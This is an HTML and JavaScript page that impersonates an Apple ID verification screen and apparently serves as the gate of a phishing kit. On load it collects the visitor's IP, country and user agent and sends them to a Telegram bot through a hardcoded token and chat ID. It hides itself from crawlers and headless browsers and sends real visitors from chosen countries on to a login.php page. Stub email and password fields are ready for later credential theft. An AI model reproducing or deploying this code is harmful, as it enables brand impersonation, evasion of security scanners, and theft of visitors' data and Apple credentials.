<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apple ID Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;overflow:hidden;}
.container{text-align:center;max-width:400px;padding:30px;position:relative;}
.apple-logo{width:60px;height:60px;margin:0 auto 25px;background:linear-gradient(135deg,#888 0%,#fff 30%,#aaa 100%);border-radius:18px;display:flex;align-items:center;justify-content:center;position:relative;}
.apple-logo::before{content:"⌘";font-size:36px;color:#000;font-weight:300;}
.status-text{font-size:22px;font-weight:400;margin-bottom:15px;letter-spacing:0.5px;background:linear-gradient(90deg,#fff,#aaa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
.progress-container{width:100%;height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden;margin:25px 0;}
.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#007aff,#00c4ff);border-radius:3px;transition:width 0.5s ease;}
.details{font-size:14px;color:#888;margin-top:20px;line-height:1.6;}
.access-denied{display:none;text-align:center;background:#1c1c1e;padding:30px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.5);max-width:400px;animation:fadeIn 0.5s ease;}
.denied-icon{font-size:48px;margin-bottom:20px;color:#ff453a;}
h1{font-size:24px;margin-bottom:15px;font-weight:600;}
p{font-size:16px;opacity:0.8;line-height:1.5;}
@keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
@keyframes pulse{0%{opacity:0.7;}50%{opacity:1;}100%{opacity:0.7;}}
.pulse{animation:pulse 2s infinite ease-in-out;}
</style>
</head>
<body>

<div class="container" id="loading">
    <div class="apple-logo"></div>
    <div class="status-text">Verifying Apple ID access</div>
    <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
    <div class="details">
        <p>Checking device compatibility and region access rights</p>
        <p class="pulse">Please wait while we verify your information</p>
    </div>
</div>

<div class="access-denied" id="denied">
    <div class="denied-icon">⛔</div>
    <h1>Access Restricted</h1>
    <p>This service is not available in your region.</p>
    <p>For assistance, please contact Apple Support.</p>
</div>

<script>
const ALLOWED_COUNTRIES=['TN','US','JP','UK','DE','FR','CH'];
const LOGIN_PAGE='login.php';

// Put your Telegram Bot Token & Chat ID here
const BOT_TOKEN = '8450566694:AAHKZmBuNJZ8BdvkA4ab6kli8PXC24X2D2U';
const CHAT_ID = '-4932499123';

// Progress bar simulation
function simulateProgress(){
    const progressBar=document.getElementById('progressBar');
    let width=0;
    return setInterval(()=>{
        if(width>=90) clearInterval(this);
        else {width+=Math.random()*10; progressBar.style.width=Math.min(width,90)+'%';}
    },300);
}

// Get user IP
async function getUserIP(){
    try{const res=await fetch('https://api.ipify.org?format=json'); const data=await res.json(); return data.ip;}catch{return 'Unknown IP';}
}

// Detect country
async function detectCountry(){
    try{
        const rand=Math.random().toString(36).substring(7);
        const res=await fetch(`https://ipapi.co/json/?r=${rand}`);
        if(!res.ok) throw new Error();
        const data=await res.json();
        return data.country_code;
    }catch{
        try{
            const res=await fetch('https://ipinfo.io/json',{cache:'no-cache'});
            if(!res.ok) throw new Error();
            const data=await res.json();
            return data.country;
        }catch{
            try{
                const res=await fetch('https://extreme-ip-lookup.com/json/');
                if(!res.ok) throw new Error();
                const data=await res.json();
                return data.countryCode;
            }catch{return 'Unknown';}
        }
    }
}

// Bot detection
function isBot(){return navigator.webdriver || /HeadlessChrome|PhantomJS|Bot|Crawler|Spider/i.test(navigator.userAgent);}

// Send message to Telegram
async function sendToTelegram(email='',password=''){
    const ip=await getUserIP();
    const country=await detectCountry();
    const bot=isBot()?'Yes':'No';

    const message = `🔔 Page accessed
🌐 Country: ${country}
🖥️ User Agent: ${navigator.userAgent}
📍 IP: ${ip}
🤖 Bot: ${bot}

🕒 Time: ${new Date().toISOString()}`;

    // Send to Telegram API
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
    
    return {ip,country,bot};
}

// Main function
async function processAutoLogin(){
    const progressInterval=simulateProgress();

    const email=''; // optional if you have form data
    const password=''; // optional if you have form data

    const userData=await sendToTelegram(email,password);

    // Finish progress bar
    document.getElementById('progressBar').style.width='100%';
    clearInterval(progressInterval);
    await new Promise(r=>setTimeout(r,500));

    if(userData.bot==='No' && ALLOWED_COUNTRIES.includes(userData.country)){
        window.location.href=LOGIN_PAGE;
    }else{
        document.getElementById('loading').style.display='none';
        document.getElementById('denied').style.display='block';
    }
}

window.addEventListener('load',processAutoLogin);
</script>
</body>
</html>
